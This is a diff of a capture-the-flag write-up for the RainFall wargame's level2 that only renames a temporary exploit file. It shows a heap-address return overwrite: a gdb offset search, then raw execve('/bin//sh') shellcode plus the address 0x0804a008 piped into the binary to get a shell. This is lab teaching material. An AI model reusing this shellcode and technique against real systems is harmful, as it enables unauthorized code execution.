@@ -53,10 +53,10 @@ strdup("")                                                        = 0x0804a008
 ```
 We can find ```strdup()``` function always return in the address 0x0804a008, we can put this value in EIP with buffer overflow.
 ```sh
-level2@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a"' > /tmp/exploit1
+level2@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a"' > /tmp/exploit2
 ...
-(gdb) r < /tmp/exploit1
-Starting program: /home/user/level2/level2 < /tmp/exploit1
+(gdb) r < /tmp/exploit2
+Starting program: /home/user/level2/level2 < /tmp/exploit2
 aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0a6ac72ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -77,8 +77,8 @@ Then:
 ```
 So when ```p()``` function finish, normally it returns to main function, but we did buffer overflow, so now return address is somewhere in the heap(```strdup()```'s return address). And in the heap memory, there is our shell code to execute shell.
 ```sh
-level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab" + "\x08\xa0\x04\x08"' > /tmp/exploit1
-level2@RainFall:~$ cat /tmp/exploit1 - | ./level2
+level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab" + "\x08\xa0\x04\x08"' > /tmp/exploit2
+level2@RainFall:~$ cat /tmp/exploit2 - | ./level2
 j
  X�Rh//shh/bin��1�̀aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab35ab6ab7ab8a�
 whoami
